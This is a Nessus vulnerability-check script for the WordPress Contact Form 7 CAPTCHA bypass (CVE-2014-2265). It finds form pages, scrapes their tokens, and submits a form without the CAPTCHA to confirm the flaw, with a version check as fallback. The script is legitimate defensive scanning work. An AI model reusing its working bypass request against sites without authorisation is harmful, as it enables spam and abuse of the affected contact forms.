#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76169);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_cve_id("CVE-2014-2265");
  script_bugtraq_id(66381);
  script_osvdb_id(104483);

  script_name(english:"Contact Form 7 Plugin for WordPress CAPTCHA Validation Bypass");
  script_summary(english:"Attempts to bypass a CAPTCHA.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
CAPTCHA validation bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Contact Form 7 Plugin for WordPress installed on the remote host
is affected by a CAPTCHA validation bypass vulnerability due to a
failure to properly verify that the CAPTCHA field has been submitted.
This can allow an attacker to bypass the CAPTCHA and send spam or
other types of data through the affected host.");
  script_set_attribute(attribute:"see_also", value:"http://www.hedgehogsecurity.co.uk/2014/02/26/contactform7-vulnerability/");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-2265.html");
  script_set_attribute(attribute:"see_also", value:"http://contactform7.com/2014/02/26/contact-form-7-372/");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/contact-form-7/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.7.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/02/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/02/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:rocklobster:contact_form_7");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Contact Form 7 Plugin";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  path = "/wp-content/plugins/contact-form-7/languages/";

  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list(
  "Project-Id-Version: (WP )?Contact Form 7", 'msgid "Contact Form 7"');

  # Versions 3.6+ -> contact-form-7.pot
  # Versions 1.6.1 - 3.5.4 ->  wpcf7.pot
  # Versions 1.1 - 1.6 -> wpcf7-ja.po

  checks[path + "contact-form-7.pot"] = regexes;
  checks[path + "wpcf7.pot"] = regexes;
  checks[path + "wpcf7-ja.po"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Get URL's from KB for contact form location
if (isnull(dir)) dir = "/";
cgis = get_kb_list_or_exit('www/' + port + '/cgi-params' + dir + '/*');
urls = make_list();

# Make a list of cgi-params for our directory and that contain 'wpcf7'
foreach cgi (keys(cgis))
{
  if (isnull(dir)) dir = "/";
  if (egrep(pattern:"wpcf7$", string:cgi))
  {
    page = cgi - ('www/'+port+'/cgi-params');
    # Numeric Permalink
    if ("#wpcf7" >< page)
    {
      page2 = ereg_replace(
        pattern : "(#wpcf7.*)",
        string  : page,
        replace : ""
      );
    }
    # Day and name / Month and name / Post name Permalink
    else
    {
      page2 = ereg_replace(
        pattern : "("+dir+"/[^/]+/).*",
        string  : page,
        replace : "\1"
      );
    }
    urls = make_list(urls, page2);
  }
  # page_id= is used for pages, while p= is used for posts
  # Grab both from KB.  Used when permalinks are 'Default'
  if ("/page_id" >< cgi || egrep(pattern:"/p$", string:cgi))
  {
    page = cgi - ('www/'+port+'/cgi-params');
    page2 = page + "=" + cgis[cgi];
    # normalize URL.  IE: /wordpress//p=2 becomes /wordpress/?p=2
    page2 = ereg_replace(pattern:"(//)", string:page2, replace:"/?");
    urls = make_list(urls, page2);
  }
}
urls = list_uniq(urls);
vuln = FALSE;

# Increase timeout to ensure we allow enough time to review our POST response
http_set_read_timeout(get_read_timeout() * 2);

foreach url (urls)
{
  res = http_send_recv3(
    method : "GET",
    item   : url,
    port   : port,
    exit_on_fail : TRUE
  );

  # Only test CAPTCHA bypass if there is a CAPTCHA being used
  if ('name="_wpcf7_captcha_challenge' >< res[2])
  {
    send_post = TRUE;
    # Get required fields to craft the POST request
    match = eregmatch(pattern:'"_wpcf7" value="(.+)"', string:res[2]);
    if (!isnull(match)) wpcf7 = match[1];

    match2 = eregmatch(pattern:'"_wpnonce" value="(.+)"', string:res[2]);
    if (!isnull(match2)) wp_nonce = match2[1];

    field_data = '';
    matches = egrep(pattern:"wpcf7-validates-as-required", string:res[2]);

    if ( (isnull(matches)) || (matches == "") ) send_post = FALSE;
    else send_post = TRUE;

    foreach match (split(matches))
    {
      rand_data = rand_str();
      m1 = eregmatch(pattern:'name="(.+)" value=', string:match);
      if (!isnull(m1))
      {
        if ("email" >< m1[1]) rand_data = rand_data + "@nessus.org";
        field_data += m1[1] + "=" + rand_data + "&";
      }
    }
    fields = "_wpcf7=" +wpcf7 + "&_wpnonce=" + wp_nonce + "&" + field_data +
      "_wpcf7_is_ajax_call=1";

    if (send_post)
    {
      res2 = http_send_recv3(
        method : "POST",
        port   : port,
        item   : url,
        data   : fields,
        content_type : "application/x-www-form-urlencoded",
        exit_on_fail : TRUE
      );
      # Sleep to give us time to review our response before sending our next req
      sleep(3);
      if ('{"mailSent":true' >< res2[2])
      {
        vuln = TRUE;
        msg = ' with the following request';
        extra_info = http_last_sent_request() + '\n';
        break;
      }
    }
  }

  if (!vuln)
  {
    # No Captcha or above attack failed, fallback to version check
    if ('name="_wpcf7_version"' >< res[2])
    {
      match = eregmatch(
        pattern : 'name="_wpcf7_version" value="(.+)"',
        string  : res[2]
      );
      if (!isnull(match))  version = match[1];

      # fixed ver is 3.7.2
      ver = split(version, sep:'.', keep:FALSE);
        for (i=0; i<max_index(ver); i++)
          ver[i] = int(ver[i]);

      if (
        (ver[0] < 3) ||
        (ver[0] == 3 && ver[1] < 7) ||
        (ver[0] == 3 && ver[1] == 7 && ver[2] < 2)
      )
      {
        vuln = TRUE;
        msg = ' by examining the version reported by the \n' + app;
        extra_info =
         '\n  URL               : ' +install_url + url+
         '\n  Installed version : ' +version+
         '\n  Fixed version     : 3.7.2\n';
        break;
      }
    }
  }
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to verify this issue'+ msg + " : " +
    '\n' + extra_info;
  security_warning(port:port, extra:report);
}
else security_warning(port);
